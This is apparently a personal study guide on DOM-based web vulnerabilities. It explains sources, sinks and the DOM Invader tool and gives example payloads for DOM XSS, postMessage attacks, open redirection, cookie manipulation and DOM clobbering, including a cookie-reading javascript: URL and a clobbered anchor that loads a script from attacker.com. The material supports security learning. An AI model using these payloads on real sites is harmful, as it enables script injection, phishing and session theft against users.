---
created: 2026-07-20
tags:
  - web_hacking
  - client-side
  - dom
status: complete
---
# 🛠️ DOM-based vulnerabilities - Comprehensive Guide

>[!info] The **Document Object Model (DOM)** is the browser's in-memory, hierarchical, object-oriented representation of a rendered HTML or XML document. It organizes document elements, attributes, and text into a tree of nodes and exposes this structure to JavaScript as a programmable object graph.

**DOM-based vulnerabilities** occur when client-side JavaScript reads user-controlled data from an untrusted **source** (e.g., `window.location`, `location.hash`) and propagates it to a sensitive **sink** (e.g., `innerHTML`, `eval()`, `location.href`) in an unsafe manner, without proper validation or sanitization.

>[!important] DOM-based vs. Server-side vulnerabilities
> **Reflected** and **stored** vulnerabilities are introduced **server-side**, where untrusted data is incorporated into the HTML/JS response before being sent to the client. 
> **DOM-based vulnerabilities** originate **entirely within the browser**. The server may return a perfectly benign response, but client-side JavaScript subsequently reads user-controlled input and performs an unsafe operation locally. Consequently, these vulnerabilities are often invisible in server-side logs and are best identified through dynamic client-side analysis.

## Taint Flow: Sources and Sinks

The process of tracking how data flows from untrusted sources to dangerous sinks is known as **taint flow analysis**. A DOM-based vulnerability requires both a source and a sink, with an uninterrupted taint flow between them.

### Common DOM-based Sources

A **source** is a JavaScript property that accepts data that is potentially attacker-controlled.

| Source | Description |
| :--- | :--- |
| `location`, `location.href`, `document.URL`, `document.baseURI` | Complete URL of the current page. |
| `location.search` | URL query string (e.g., `?a=1&b=2`). |
| `location.hash` | Fragment identifier (e.g., `#section1`). |
| `location.pathname` | URL path. |
| `document.referrer` | Referrer URL. |
| `document.cookie` | Cookies (non-`HttpOnly`, semicolon-separated). |
| `window.name` | Name of a window's browsing context; persists across navigations. |
| `localStorage`, `sessionStorage` | Client-side key-value storage. |
| `window.postMessage()` | Data received via cross-origin/cross-window messages. |
| `URLSearchParams` | JavaScript interface to work with the URL query string. |

### Common DOM-based Sinks

A **sink** is a function or DOM object that can execute code or trigger undesirable behavior if provided with attacker-controlled data. Different sinks introduce different classes of vulnerabilities.

| Sink | Vulnerability Type | Description |
| :--- | :--- | :--- |
| `eval()`, `Function()`, `setTimeout()`, `setInterval()` | DOM-based XSS | Executes JavaScript code represented as a string. |
| `element.innerHTML`, `element.outerHTML`, `document.write()` | DOM-based XSS | Parses and renders HTML markup directly into the document. |
| `location`, `location.href`, `location.assign()`, `location.replace()` | Open Redirection | Reads/writes the URL, navigating the browser. Can lead to XSS via `javascript:` schemas. |
| `document.cookie` | Cookie Manipulation | Sets cookies directly in the browser. |
| `element.src`, `element.href`, `element.action` | Link Manipulation | Alters destination of scripts, links, or form submissions. |
| `WebSocket()` | WebSocket-URL Poisoning | Establishes a WebSocket connection with the server. |
| `JSON.parse()` | Client-side JSON Injection | Parses a JSON string; dangerous if output is later used in sinks. |

---

## Tooling: DOM Invader

>[!tip] **DOM Invader** is a Burp Suite extension built into Burp's embedded Chromium browser, designed to automate the discovery of DOM-based vulnerabilities.

To use DOM Invader:
1. Open Burp's embedded browser.
2. Click the DOM Invader extension icon (next to the search bar) and toggle it **ON**.
3. Reload the tab, open browser DevTools (`F12`), and navigate to the **DOM Invader** tab.
4. Enable **Inject canary into all sources** (in Misc settings) to automatically track how input flows to sinks.
5. Enable **Postmessage interception** to intercept, edit, and replay `postMessage()` calls.

If an exploitable sink is detected, DOM Invader will flag it, highlighting the tainted path and offering PoC generation.

---

## 1. DOM-based XSS

>**DOM-based XSS** occurs when client-side JavaScript processes untrusted data without sufficient validation and uses it to dynamically modify the DOM in an unsafe manner, leading to arbitrary JavaScript execution.

### Taint Flow Analysis

Testing for DOM XSS involves tracing the execution flow from source to sink:
1. **Identify sources**: Look for usages of `location.search`, `location.hash`, etc.
2. **Identify sinks**: Look for `innerHTML`, `eval()`, `document.write()`, etc.
3. **Static Analysis**: Read the JavaScript to see if data flows uninterrupted (and unsanitized) from source to sink.
4. **Dynamic Analysis**: Inject unique strings (canaries like `domxss1234`) into sources and observe if they appear unescaped in sinks via DevTools.

### Exploiting Different Sinks

- **HTML Sinks (`innerHTML`, `document.write()`)**:
  These parse HTML. Note that `innerHTML` refuses to execute injected `<script>` tags, so standard primitives rely on event handlers, such as image load failures:
  ```html
  <img src=x onerror=alert(1)>
  <iframe src="javascript:alert(1)">
  ```

- **JavaScript Execution Sinks (`eval()`, `setTimeout()`)**:
  These evaluate JavaScript directly. If the input is placed inside a string, you must break out of the context.
  ```js
  // Context: setTimeout("updateUI('" + source + "')", 1000);
  // Payload:
  '-alert(1)-'
  ```

---

## 2. Web Message Vulnerabilities

>**Web Messaging** (`window.postMessage()`) allows scripts running in different browser contexts (windows, tabs, iframes) to exchange data across origins, bypassing the Same-Origin Policy (SOP).

If a receiving window implements a `message` event listener that improperly validates the origin or unsafely processes `event.data`, it becomes vulnerable to DOM-based attacks.

### Mechanics & Origin Verification Bypasses

A secure listener should strictly verify `event.origin`:
```javascript
window.addEventListener('message', (event) => {
    if (event.origin !== 'https://trusted.example.com') return; // Strict equality check
    // Process event.data...
});
```

**Common Flaws:**
- **No verification**: The listener trusts all origins.
- **Flawed `indexOf()`**: `if (event.origin.indexOf('trusted.example.com') > -1)` allows bypasses like `https://trusted.example.com.attacker.com`.
- **Flawed `startsWith()` / `endsWith()`**: Similar logic errors allow subdomain or domain-suffix spoofing.

### Exploitation via `postMessage()`

To deliver an exploit, an attacker typically hosts an `<iframe>` on their site that loads the vulnerable application and sends a malicious message once loaded.

>[!example] DOM XSS using Web Messages (innerHTML sink)
> **Vulnerable Code**:
> ```javascript
> window.addEventListener('message', function(e) {
>     document.getElementById('ads').innerHTML = e.data;
> });
> ```
> **Exploit**:
> ```html
> <iframe src="https://vulnerable.com/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')"></iframe>
> ```
> *Reference: [[🛠️ DOM-based vulnerabilities labs#1. DOM XSS using web messages]]*

>[!example] DOM XSS using Web Messages and JavaScript URL (Redirect sink)
> **Vulnerable Code**:
> ```javascript
> window.addEventListener('message', function(e) {
>     var url = e.data;
>     if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
>         location.href = url; // Navigation sink
>     }
> });
> ```
> **Exploit**:
> ```html
> <iframe src="https://vulnerable.com/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>
> ```
> The payload `javascript:print()//http:` executes code while bypassing the `indexOf` check using a JS comment.
> *Reference: [[🛠️ DOM-based vulnerabilities labs#2. DOM XSS using web messages and a JavaScript URL]]*

>[!example] DOM XSS using Web Messages and `JSON.parse()`
> **Vulnerable Code**:
> ```javascript
> window.addEventListener('message', function(e) {
>     let d = JSON.parse(e.data); // Parses incoming JSON
>     if (d.type === "load-channel") {
>         iframe.src = d.url; // Sink
>     }
> });
> ```
> **Exploit**:
> ```html
> <iframe src="https://vulnerable.com/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'></iframe>
> ```
> *Reference: [[🛠️ DOM-based vulnerabilities labs#3. DOM XSS using web messages and JSON.parse]]*

---

## 3. DOM-based Open Redirection

>**DOM-based open redirection** occurs when an application incorporates user-controlled input into the destination of a client-side navigation action without sufficient validation. This can facilitate severe phishing attacks or escalate to DOM XSS.

**Sinks**: `window.location`, `location.href`, `location.assign()`, `location.replace()`.

>[!example] Open Redirection via URL Extraction
> **Vulnerable Code**:
> ```javascript
> let returnUrl = /url=(https?:\/\/.+)/.exec(location);
> location.href = returnUrl ? returnUrl[1] : "/";
> ```
> This regex parses the target directly from the *entire* URL string (`location`), not just the query string (`location.search`).
> 
> **Exploit**:
> ```
> https://vulnerable.com/post?postId=1&url=https://attacker.com/
> ```
> The user clicks a seemingly safe link and the client-side JS redirects them to the attacker server.
> *Reference: [[🛠️ DOM-based vulnerabilities labs#4. DOM-based open redirection]]*

>[!important] Escalation to DOM XSS
> If the redirect sink does not validate the protocol schema (e.g., enforcing only `http/https`), an attacker can supply a `javascript:` URL to achieve DOM XSS: `?url=javascript:alert(document.cookie)`.

---

## 4. DOM-based Cookie Manipulation

>**DOM-based cookie manipulation** occurs when a script writes user-controlled data into the `document.cookie` object without validation. 

While this can lead to session fixation, its primary danger is serving as an exploit chain primitive. If another part of the application unsafely reads cookies and reflects them into the DOM, you can chain Cookie Manipulation to achieve DOM XSS.

>[!example] Cookie Manipulation Escalation
> **Vulnerable Code**:
> ```javascript
> document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
> ```
> The script takes the full URL and assigns it to a cookie. The application then reflects this cookie value directly into an `href` attribute on the page.
> 
> **Exploit**:
> 1. Inject payload into the URL to poison the cookie: `?productId=1&'><script>print()</script>`
> 2. Force the victim to request the page a second time, triggering the XSS when the poisoned cookie is read and reflected.
> 
> ```html
> <iframe src="https://vulnerable.com/product?productId=1&'><script>print()</script>" 
>         onload="if(!window.x)this.src='https://vulnerable.com';window.x=1;">
> ```
> *Reference: [[🛠️ DOM-based vulnerabilities labs#5. DOM-based cookie manipulation]]*

---

## 5. DOM Clobbering

>**DOM Clobbering** is an advanced technique where an attacker injects non-script HTML elements to overwrite global JavaScript variables or DOM properties. 

This is highly effective in environments where XSS is heavily filtered (e.g., strict sanitizers) but basic attributes like `id` or `name` on tags like `<a>` or `<form>` are allowed. When a browser encounters an element with an `id` or `name`, it automatically creates a global property on the `window` or `document` object referencing that node.

### Clobbering Global Variables

A very common pattern in JavaScript is falling back to an empty object if a global variable isn't defined:
```javascript
var someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url; // Dangerous sink
document.body.appendChild(script);
```

**Exploit**:
You can clobber `window.someObject` by injecting an `<a>` tag with `id="someObject"`. To define the `.url` property, you inject a second anchor tag. The DOM groups elements with the same ID into a DOM collection, and the `name` attribute acts as a property on that collection:

```html
<a id=someObject><a id=someObject name=url href=//attacker.com/evil.js>
```
When the script evaluates `someObject.url`, it retrieves the `href` attribute of the second anchor tag, dynamically loading the attacker's script.

### Clobbering DOM Properties

You can also clobber native DOM properties using `<form>` and `<input>` elements to bypass client-side filters.
```html
<form onclick=alert(1)><input id=attributes>Click me</form>
```
If a sanitizer attempts to loop over `element.attributes` to strip dangerous handlers (like `onclick`), the injected `<input id=attributes>` clobbers the `attributes` property of the form. The sanitizer ends up inspecting the `<input>` element instead of the form's attributes, failing to remove the malicious `onclick` payload.

---

## Other Notable DOM-based Vulnerabilities

- **Client-side JSON Injection**: Sinks like `JSON.parse()` process attacker-controlled strings into objects. Dangerous if those objects influence logic.
- **WebSocket URL Poisoning**: Attacker controls the URL passed to the `WebSocket()` constructor, forcing the client to connect to an attacker's server to intercept sensitive data or subvert logic.
- **Link Manipulation**: Attacker controls variables setting `element.href` or `element.action`, allowing them to quietly hijack form submissions or navigations.
- **Document-Domain Manipulation**: `document.domain` is used to bypass SOP for subdomains. If dynamically set from a source, an attacker could force a trusted domain to accept cross-origin requests from an attacker-controlled sibling subdomain.
